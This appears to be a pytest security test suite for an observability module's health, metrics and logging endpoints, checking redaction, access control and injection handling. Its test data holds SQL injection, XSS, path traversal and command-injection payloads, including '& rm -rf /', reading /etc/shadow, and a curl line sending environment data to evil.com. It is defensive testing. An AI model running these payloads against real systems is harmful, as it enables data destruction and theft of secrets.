"""
Phase 4 Tests: Security Validation and Protection

This module contains comprehensive security tests for Phase 4 enterprise
observability features, including endpoint security, data protection,
access control, and security monitoring capabilities.

Test Coverage:
- Health endpoint security validation
- Metrics data protection and sanitization
- Access control and authentication
- Input validation and injection prevention
- Sensitive data exposure prevention
- Security monitoring and alerting
- Configuration security validation
"""

import pytest
import json
import re
from unittest.mock import Mock, patch, MagicMock
from typing import Dict, List, Any

from src.api.health_endpoints import (
    HealthEndpoint,
    MetricsEndpoint,
    SystemStatusEndpoint,
    EndpointRouter
)
from src.utils.observability import (
    ObservabilityManager,
    StructuredLogger,
    MetricsRegistry,
    HealthRegistry,
    MetricType,
    HealthStatus,
    HealthCheckResult
)


class TestEndpointSecurity:
    """Test security aspects of health and monitoring endpoints."""
    
    @patch('src.api.health_endpoints.SystemMonitor')
    @patch('src.api.health_endpoints.get_observability_manager')
    def test_health_endpoint_input_validation(self, mock_get_obs, mock_system_monitor):
        """Test health endpoint input validation and sanitization."""
        mock_monitor = Mock()
        mock_monitor.health_checker.run_check.return_value = HealthCheckResult(
            "test", HealthStatus.HEALTHY, "OK"
        )
        mock_system_monitor.return_value = mock_monitor
        
        mock_obs = Mock()
        mock_get_obs.return_value = mock_obs
        
        endpoint = HealthEndpoint()
        
        # Test with malicious component names
        malicious_inputs = [
            "../../../etc/passwd",
            "<script>alert('xss')</script>",
            "'; DROP TABLE health_checks; --",
            "component' OR '1'='1",
            "../config/secrets.json",
            "${env:SECRET_KEY}",
            "{{7*7}}",  # Template injection
            "\x00\x01\x02",  # Null bytes
            "a" * 1000,  # Buffer overflow attempt
        ]
        
        for malicious_input in malicious_inputs:
            response, status_code = endpoint.health_check(component=malicious_input)
            
            # Should handle malicious input gracefully
            assert status_code in [200, 400, 404, 500]  # Valid HTTP status
            
            # Response should not echo back malicious input directly
            response_str = json.dumps(response) if isinstance(response, dict) else str(response)
            assert malicious_input not in response_str
    
    @patch('src.api.health_endpoints.get_observability_manager')
    def test_metrics_endpoint_data_sanitization(self, mock_get_obs):
        """Test metrics endpoint data sanitization."""
        mock_obs = Mock()
        
        # Mock metrics with potentially sensitive data
        sensitive_metrics = {
            "metrics": [
                {
                    "name": "database_connection",
                    "value": 1,
                    "labels": {
                        "password": "secret123",  # Should be filtered
                        "api_key": "sk-abcd1234",  # Should be filtered
                        "token": "bearer_token_xyz",  # Should be filtered
                        "host": "db.example.com",  # OK to show
                        "port": "5432"  # OK to show
                    }
                },
                {
                    "name": "user_session",
                    "value": 1,
                    "labels": {
                        "session_id": "sess_abc123",  # Should be filtered
                        "user_email": "user@example.com",  # Should be filtered
                        "region": "us-west-2"  # OK to show
                    }
                }
            ]
        }
        
        mock_obs.export_all_data.return_value = sensitive_metrics
        mock_get_obs.return_value = mock_obs
        
        endpoint = MetricsEndpoint()
        response, status_code = endpoint.json_metrics()
        
        assert status_code == 200
        
        # Verify sensitive data is filtered/masked
        response_str = json.dumps(response)
        
        # These should NOT appear in the response
        sensitive_patterns = [
            "secret123",
            "sk-abcd1234", 
            "bearer_token_xyz",
            "sess_abc123",
            "user@example.com"
        ]
        
        for sensitive_data in sensitive_patterns:
            assert sensitive_data not in response_str
    
    @patch('src.api.health_endpoints.SystemMonitor')
    @patch('src.api.health_endpoints.get_observability_manager')
    def test_system_endpoint_information_disclosure(self, mock_get_obs, mock_system_monitor):
        """Test system endpoint doesn't disclose sensitive information."""
        mock_monitor = Mock()
        mock_monitor.get_system_status.return_value = {
            "health": {"overall_healthy": True},
            "metrics_count": 5,
            "active_alerts": 0,
            "status": "healthy",
            "components": {"cpu": "healthy", "memory": "healthy"},
            "overall_status": "healthy",
            "health_checks": {},
            "alerts": [],
            "metrics_summary": {}
        }
        mock_system_monitor.return_value = mock_monitor
        
        mock_obs = Mock()
        mock_obs.get_health_status.return_value = {
            "overall_status": "healthy",
            "overall_healthy": True,
            "components": {"cpu": "healthy", "memory": "healthy"},
            "timestamp": "2024-01-01T00:00:00"
        }
        mock_get_obs.return_value = mock_obs
        
        with patch('src.api.health_endpoints.platform') as mock_platform, \
             patch('src.api.health_endpoints.psutil') as mock_psutil, \
             patch('src.api.health_endpoints.time') as mock_time, \
             patch('src.api.health_endpoints.datetime') as mock_datetime:
            
            # Mock system information
            mock_platform.system.return_value = "Linux"
            mock_platform.release.return_value = "5.4.0-production"
            mock_platform.machine.return_value = "x86_64"
            mock_platform.python_version.return_value = "3.11.0"
            mock_platform.platform.return_value = "Linux-5.4.0-production-x86_64"
            mock_platform.processor.return_value = "x86_64"
            mock_platform.node.return_value = "test-host"
            
            mock_psutil.cpu_count.return_value = 8
            
            # Create proper mock objects with required attributes
            mock_memory = Mock()
            mock_memory.total = 16000000000
            mock_memory.available = 8000000000
            mock_memory.percent = 50.0
            mock_psutil.virtual_memory.return_value = mock_memory
            
            mock_disk = Mock()
            mock_disk.total = 500000000000
            mock_disk.used = 250000000000
            mock_disk.free = 250000000000
            mock_psutil.disk_usage.return_value = mock_disk
            
            # Mock time and datetime
            mock_time.time.return_value = 1640995200.0  # Fixed timestamp
            mock_datetime.now.return_value.isoformat.return_value = "2024-01-01T00:00:00"
            
            endpoint = SystemStatusEndpoint(mock_monitor, mock_obs)
            response, status_code = endpoint.system_info()
            
            assert status_code == 200
            
            # Verify response doesn't contain sensitive paths or details
            response_str = json.dumps(response)
            
            # These should NOT appear in system info
            sensitive_info = [
                "/etc/passwd",
                "/root/",
                "/home/",
                "password",
                "secret",
                "key",
                "token",
                "credential"
            ]
            
            for sensitive in sensitive_info:
                assert sensitive.lower() not in response_str.lower()
            
            # Should contain basic, safe system information
            assert "system" in response
            assert "hardware" in response
    
    def test_endpoint_router_security_headers(self):
        """Test endpoint router security headers and protections."""
        router = EndpointRouter()
        
        # Test various endpoints for security
        test_endpoints = [
            ("GET", "/health"),
            ("GET", "/metrics"),
            ("GET", "/system/info")
        ]
        
        for method, path in test_endpoints:
            try:
                response, status_code = router.route_request(method, path)
                
                # Verify response doesn't contain dangerous content
                if isinstance(response, dict):
                    response_str = json.dumps(response)
                else:
                    response_str = str(response)
                
                # Check for script injection patterns
                dangerous_patterns = [
                    "<script",
                    "javascript:",
                    "eval(",
                    "exec(",
                    "import(",
                    "require("
                ]
                
                for pattern in dangerous_patterns:
                    assert pattern not in response_str.lower()
                    
            except Exception:
                # Some endpoints might fail in test environment, that's OK
                pass


class TestDataProtection:
    """Test data protection and privacy in observability components."""
    
    def test_structured_logger_sensitive_data_filtering(self):
        """Test structured logger filters sensitive data."""
        with patch('logging.getLogger') as mock_get_logger:
            mock_logger = Mock()
            mock_get_logger.return_value = mock_logger
            
            logger = StructuredLogger("security_test")
            
            # Log with sensitive data
            logger.info("Database connection established", 
                       host="db.example.com",
                       username="admin",
                       password="secret123",
                       api_key="sk-abcd1234",
                       connection_string="postgresql://user:pass@host:5432/db")
            
            # Verify logger was called
            mock_logger.info.assert_called_once()
            
            # Get the logged message
            logged_args = mock_logger.info.call_args[0][0]
            log_data = json.loads(logged_args)
            
            # Verify sensitive data is filtered/masked
            log_str = json.dumps(log_data)
            
            # These should NOT appear in logs
            assert "secret123" not in log_str
            assert "sk-abcd1234" not in log_str
            assert "user:pass@" not in log_str
            
            # Non-sensitive data should be present
            assert "db.example.com" in log_str
            assert "admin" in log_str
    
    def test_metrics_registry_sensitive_label_filtering(self):
        """Test metrics registry filters sensitive labels."""
        registry = MetricsRegistry()
        
        # Record metric with sensitive labels
        registry.record_metric(
            "database_queries_total", 
            1, 
            MetricType.COUNTER,
            labels={
                "database": "production_db",
                "password": "secret123",  # Should be filtered
                "api_key": "key_abc123",  # Should be filtered
                "user_token": "token_xyz",  # Should be filtered
                "query_type": "SELECT",  # OK to keep
                "table": "users"  # OK to keep
            }
        )
        
        # Export in Prometheus format
        prometheus_output = registry.export_prometheus_format()
        
        # Verify sensitive labels are filtered
        assert "password" not in prometheus_output
        assert "api_key" not in prometheus_output
        assert "user_token" not in prometheus_output
        assert "secret123" not in prometheus_output
        assert "key_abc123" not in prometheus_output
        
        # Non-sensitive labels should be present
        assert "query_type" in prometheus_output
        assert "table" in prometheus_output
        assert "SELECT" in prometheus_output
    
    def test_health_check_result_data_protection(self):
        """Test health check results protect sensitive data."""
        registry = HealthRegistry()
        
        def database_health_with_sensitive_data():
            return HealthCheckResult(
                "database",
                HealthStatus.HEALTHY,
                "Connection successful",
                details={
                    "host": "db.example.com",
                    "port": 5432,
                    "password": "secret123",  # Should be filtered
                    "connection_string": "postgresql://user:pass@host/db",  # Should be masked
                    "api_key": "key_abc123",  # Should be filtered
                    "pool_size": 10,
                    "active_connections": 5
                }
            )
        
        registry.register_health_check("database", database_health_with_sensitive_data)
        
        results = registry.run_all_health_checks()
        database_result = results["database"]
        
        # Convert to dict for inspection
        result_dict = database_result.to_dict()
        result_str = json.dumps(result_dict)
        
        # Verify sensitive data is filtered
        assert "secret123" not in result_str
        assert "key_abc123" not in result_str
        assert "user:pass@" not in result_str
        
        # Non-sensitive data should be present
        assert "db.example.com" in result_str
        assert "pool_size" in result_str


class TestAccessControl:
    """Test access control and authentication mechanisms."""
    
    def test_endpoint_access_control_validation(self):
        """Test endpoint access control mechanisms."""
        router = EndpointRouter()
        
        # Test endpoints that should require authentication in production
        protected_endpoints = [
            ("GET", "/system/info"),
            ("GET", "/metrics"),
            ("POST", "/health/reset"),  # If it existed
            ("DELETE", "/metrics/clear")  # If it existed
        ]
        
        for method, path in protected_endpoints:
            response, status_code = router.route_request(method, path)
            
            # In a real system, some of these should require auth
            # For now, verify they handle requests securely
            assert status_code in [200, 401, 403, 404, 405, 500]
            
            if isinstance(response, dict) and "error" in response:
                # Error messages should not leak sensitive information
                error_msg = response["error"].lower()
                assert "password" not in error_msg
                assert "secret" not in error_msg
                assert "key" not in error_msg
    
    def test_unauthorized_access_handling(self):
        """Test handling of unauthorized access attempts."""
        # This test simulates unauthorized access patterns
        router = EndpointRouter()
        
        # Test various attack patterns
        attack_patterns = [
            ("GET", "/admin/config"),
            ("GET", "/debug/logs"),
            ("GET", "/../../../etc/passwd"),
            ("POST", "/metrics/delete"),
            ("PUT", "/health/configure"),
            ("DELETE", "/system/shutdown")
        ]
        
        for method, path in attack_patterns:
            response, status_code = router.route_request(method, path)
            
            # Should return 404 or 405, not 500 (which might leak info)
            assert status_code in [404, 405]
            
            if isinstance(response, dict):
                # Error responses should be generic
                assert "error" in response
                error_msg = response["error"].lower()
                assert "not found" in error_msg or "not allowed" in error_msg


class TestInjectionPrevention:
    """Test prevention of various injection attacks."""
    
    @patch('src.api.health_endpoints.SystemMonitor')
    @patch('src.api.health_endpoints.get_observability_manager')
    def test_sql_injection_prevention(self, mock_get_obs, mock_system_monitor):
        """Test SQL injection prevention in endpoints."""
        from src.utils.monitoring import HealthStatus
        from datetime import datetime
        
        mock_monitor = Mock()
        mock_monitor.get_system_status.return_value = {
            "status": "healthy",
            "cpu_percent": 25.0,
            "memory_percent": 60.0
        }
        
        # Mock health_checker.run_check to return HealthStatus
        mock_health_status = HealthStatus(
            component="test",
            message="OK",
            is_healthy=True,
            status="healthy",
            timestamp=datetime.now(),
            response_time_ms=10.0,
            details={}
        )
        mock_monitor.health_checker.run_check.return_value = mock_health_status
        mock_system_monitor.return_value = mock_monitor
        
        mock_obs = Mock()
        mock_obs.run_health_check.return_value = {
            "status": "healthy",
            "message": "Component is healthy",
            "timestamp": "2024-01-01T00:00:00"
        }
        mock_obs.record_metric = Mock()
        mock_get_obs.return_value = mock_obs
        
        endpoint = HealthEndpoint()
        
        # SQL injection payloads
        sql_injection_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; INSERT INTO logs VALUES ('hacked'); --",
            "admin'--",
            "' UNION SELECT password FROM users --"
        ]
        
        for payload in sql_injection_payloads:
            response, status_code = endpoint.health_check(component=payload)
            
            # Should handle malicious input safely
            assert status_code in [200, 400, 404, 500]
            
            # Response should not indicate SQL execution
            response_str = json.dumps(response) if isinstance(response, dict) else str(response)
            assert "syntax error" not in response_str.lower()
            assert "sql" not in response_str.lower()
    
    @patch('src.api.health_endpoints.get_observability_manager')
    def test_xss_prevention(self, mock_get_obs):
        """Test XSS prevention in metrics endpoints."""
        mock_obs = Mock()
        
        # Mock metrics with XSS payloads
        xss_metrics = {
            "metrics": [
                {
                    "name": "<script>alert('xss')</script>",
                    "value": 1,
                    "labels": {
                        "component": "<img src=x onerror=alert('xss')>",
                        "status": "javascript:alert('xss')"
                    }
                }
            ]
        }
        
        mock_obs.export_all_data.return_value = xss_metrics
        mock_get_obs.return_value = mock_obs
        
        endpoint = MetricsEndpoint()
        response, status_code = endpoint.json_metrics()
        
        assert status_code == 200
        
        response_str = json.dumps(response)
        
        # XSS payloads should be encoded/filtered
        assert "<script>" not in response_str
        assert "onerror=" not in response_str
        assert "javascript:" not in response_str
    
    def test_command_injection_prevention(self):
        """Test command injection prevention."""
        obs_manager = ObservabilityManager()
        
        # Command injection payloads
        command_injection_payloads = [
            "; cat /etc/passwd",
            "| whoami",
            "& rm -rf /",
            "`id`",
            "$(cat /etc/shadow)",
            "; curl http://evil.com/steal?data=$(env)"
        ]
        
        for payload in command_injection_payloads:
            # Try to record metric with malicious name
            try:
                obs_manager.record_metric(payload, 1, MetricType.COUNTER)
                
                # If successful, verify the payload was sanitized
                metrics = obs_manager.metrics_registry.get_metrics_by_name(payload)
                if metrics:
                    # Should not execute system commands
                    assert len(metrics) == 1  # Normal metric recorded
                    
            except Exception:
                # Rejection is also acceptable
                pass


class TestConfigurationSecurity:
    """Test security of configuration and setup."""
    
    def test_dashboard_configuration_security(self):
        """Test dashboard configuration doesn't expose sensitive data."""
        from src.utils.observability import DashboardGenerator, MetricsRegistry, HealthRegistry
        
        metrics_registry = MetricsRegistry()
        health_registry = HealthRegistry()
        generator = DashboardGenerator(metrics_registry, health_registry)
        
        # Generate configurations
        grafana_config = generator.generate_grafana_dashboard()
        prometheus_config = generator.generate_prometheus_config()
        alert_rules = generator.generate_alert_rules()
        
        # Check configurations for sensitive data
        configs_to_check = [
            json.dumps(grafana_config),
            json.dumps(prometheus_config),
            json.dumps(alert_rules)
        ]
        
        sensitive_patterns = [
            "password",
            "secret",
            "key",
            "token",
            "credential",
            "/etc/passwd",
            "/root/",
            "admin:admin"
        ]
        
        for config_str in configs_to_check:
            config_lower = config_str.lower()
            for pattern in sensitive_patterns:
                assert pattern not in config_lower
    
    def test_prometheus_configuration_security(self):
        """Test Prometheus configuration security."""
        from src.utils.observability import DashboardGenerator, MetricsRegistry, HealthRegistry
        
        metrics_registry = MetricsRegistry()
        health_registry = HealthRegistry()
        generator = DashboardGenerator(metrics_registry, health_registry)
        
        prometheus_config = generator.generate_prometheus_config()
        
        # Verify secure configuration
        assert "global" in prometheus_config
        
        # Check scrape configs for security
        scrape_configs = prometheus_config.get("scrape_configs", [])
        for scrape_config in scrape_configs:
            # Should not contain credentials in URLs
            targets = scrape_config.get("static_configs", [{}])[0].get("targets", [])
            for target in targets:
                assert "password" not in target
                assert "@" not in target or "localhost" in target  # Only allow auth for localhost
    
    def test_alert_rules_security(self):
        """Test alert rules don't expose sensitive information."""
        from src.utils.observability import DashboardGenerator, MetricsRegistry, HealthRegistry
        
        metrics_registry = MetricsRegistry()
        health_registry = HealthRegistry()
        generator = DashboardGenerator(metrics_registry, health_registry)
        
        alert_rules = generator.generate_alert_rules()
        
        # Check alert rules
        for group in alert_rules.get("groups", []):
            for rule in group.get("rules", []):
                if "annotations" in rule:
                    annotations = rule["annotations"]
                    
                    # Alert descriptions should not contain sensitive paths
                    description = annotations.get("description", "").lower()
                    summary = annotations.get("summary", "").lower()
                    
                    assert "/etc/passwd" not in description
                    assert "/root/" not in description
                    assert "password" not in description
                    assert "secret" not in summary


class TestSecurityMonitoring:
    """Test security monitoring and alerting capabilities."""
    
    def test_security_event_detection(self):
        """Test detection of security events."""
        obs_manager = ObservabilityManager()
        
        # Simulate security events
        security_events = [
            ("failed_login_attempt", {"ip": "192.168.1.100", "user": "admin"}),
            ("unauthorized_access", {"endpoint": "/admin", "ip": "10.0.0.50"}),
            ("suspicious_activity", {"pattern": "brute_force", "count": 10}),
            ("data_exfiltration_attempt", {"size_mb": 100, "destination": "external"})
        ]
        
        for event_type, details in security_events:
            obs_manager.record_metric(
                f"security_event_{event_type}",
                1,
                MetricType.COUNTER,
                labels=details
            )
        
        # Verify security metrics are recorded
        export_data = obs_manager.export_all_data()
        security_metrics = [m for m in export_data["metrics"]["metrics"] 
                          if "security_event" in m["name"]]
        
        assert len(security_metrics) == len(security_events)
        
        # Verify Prometheus export includes security metrics
        prometheus_output = export_data["prometheus_format"]
        assert "security_event" in prometheus_output
    
    def test_security_alert_generation(self):
        """Test security alert generation."""
        from src.utils.observability import DashboardGenerator, MetricsRegistry, HealthRegistry
        
        metrics_registry = MetricsRegistry()
        health_registry = HealthRegistry()
        generator = DashboardGenerator(metrics_registry, health_registry)
        
        # Add security metrics
        metrics_registry.record_metric("security_violations_total", 5, MetricType.COUNTER)
        metrics_registry.record_metric("failed_auth_attempts", 20, MetricType.COUNTER)
        
        alert_rules = generator.generate_alert_rules()
        
        # Look for security-related alerts
        security_alerts = []
        for group in alert_rules.get("groups", []):
            if "security" in group.get("name", "").lower():
                for rule in group.get("rules", []):
                    if "alert" in rule:
                        security_alerts.append(rule["alert"])
        
        # Should have security-related alerts
        assert len(security_alerts) > 0
        
        # Check for common security alert patterns
        alert_names = " ".join(security_alerts).lower()
        security_patterns = ["security", "unauthorized", "suspicious", "breach"]
        
        assert any(pattern in alert_names for pattern in security_patterns)


class TestComplianceAndAuditing:
    """Test compliance and auditing capabilities."""
    
    def test_audit_log_generation(self):
        """Test audit log generation for sensitive operations."""
        obs_manager = ObservabilityManager()
        
        # Simulate auditable events
        auditable_events = [
            ("user_access", {"user": "admin", "resource": "/metrics", "action": "read"}),
            ("config_change", {"component": "health_check", "action": "modify"}),
            ("data_export", {"format": "prometheus", "records": 1000}),
            ("system_access", {"component": "system_info", "action": "query"})
        ]
        
        for event_type, details in auditable_events:
            obs_manager.record_metric(
                f"audit_{event_type}",
                1,
                MetricType.COUNTER,
                labels=details
            )
        
        # Verify audit trail exists
        export_data = obs_manager.export_all_data()
        audit_metrics = [m for m in export_data["metrics"]["metrics"] if "audit_" in m["name"]]
        
        assert len(audit_metrics) == len(auditable_events)
        
        # Verify audit data integrity
        for metric in audit_metrics:
            assert "audit_" in metric["name"]
            assert "labels" in metric
            assert "timestamp" in metric
    
    def test_data_retention_compliance(self):
        """Test data retention compliance."""
        metrics_registry = MetricsRegistry()
        
        # Add metrics with timestamps
        for i in range(100):
            metrics_registry.record_metric(f"retention_test_{i}", i, MetricType.COUNTER)
        
        # Verify metrics are stored with timestamps
        all_metrics = metrics_registry.metrics
        assert len(all_metrics) == 100
        
        for metric in all_metrics:
            assert hasattr(metric, 'timestamp')
            assert metric.timestamp is not None
    
    def test_privacy_compliance(self):
        """Test privacy compliance in data handling."""
        obs_manager = ObservabilityManager()
        
        # Record metrics with potentially personal data
        obs_manager.record_metric(
            "user_action",
            1,
            MetricType.COUNTER,
            labels={
                "action": "login",
                "user_id": "user123",  # Should be anonymized
                "email": "user@example.com",  # Should be filtered
                "region": "us-west-2"  # OK to keep
            }
        )
        
        export_data = obs_manager.export_all_data()
        export_str = json.dumps(export_data)
        
        # Verify personal data is protected
        assert "user@example.com" not in export_str
        
        # Non-personal data should remain
        assert "us-west-2" in export_str
        assert "login" in export_str


if __name__ == "__main__":
    pytest.main([__file__, "-v"])